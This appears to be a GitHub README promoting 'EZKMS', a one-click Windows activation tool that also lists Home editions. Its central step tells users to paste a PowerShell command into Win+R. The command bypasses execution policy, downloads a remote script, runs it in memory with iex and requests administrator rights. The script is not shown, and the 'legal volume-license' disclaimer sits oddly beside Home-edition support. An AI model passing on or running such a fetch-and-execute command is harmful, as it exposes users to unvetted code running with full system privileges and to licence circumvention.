<div align="center">

# ⚡ EZKMS

**One-click Windows activation utility**

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows&logoColor=white)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?logo=powershell&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green)
![Status](https://img.shields.io/badge/status-active-brightgreen)

</div>

---

## 📖 Overview

EZKMS is a lightweight, one-click Windows activation tool for legal volume-license use. No installers, no bloat — paste one command and you're done.

---

## 🚀 How to Run (1-Click)

> **No manual elevation needed** — the command handles it automatically.

**1.** Press **Win + R**

**2.** Paste the following command:

```powershell
powershell -ExecutionPolicy Bypass -Command "& {$Host.UI.RawUI.BackgroundColor='Black'; $Host.UI.RawUI.ForegroundColor='White'; Clear-Host; iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xnucade/EZKMS/refs/heads/main/EZKMS.ps1'))}"
```

**3.** Press **Enter**

**4.** Click **Yes** if prompted (UAC / Run as Administrator)

The tool opens automatically.

---

## 🛠️ How to Use

Once the tool is open:

| Step | Action |
|---|---|
| 1 | Your detected Windows edition is shown at the top |
| 2 | Type the number `1–6` matching your Windows version |
| 3 | Press **Enter** |
| 4 | Wait for `[SUCCESS]` |
| 5 | Press **Enter** to return to the menu |
| 6 | Type `0` to exit |

---

## 📋 Supported Editions

| Edition | Supported |
|---|---|
| Windows 10/11 Home | ✅ |
| Windows 10/11 Pro | ✅ |
| Windows 10/11 Education | ✅ |

---

## 🧰 Requirements

- Windows 10 or Windows 11
- Internet connection
- Administrator privileges (prompted automatically)

---

## ⚠️ Disclaimer

EZKMS is intended for **legal volume-license use only**. Use this tool only on systems you own or are authorized to manage. The author is not responsible for any misuse of this software.

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).

---

<div align="center">
  One command. One click. Activated.<br><br>
  Made by <a href="https://github.com/xnucade">xnucade</a>
</div>
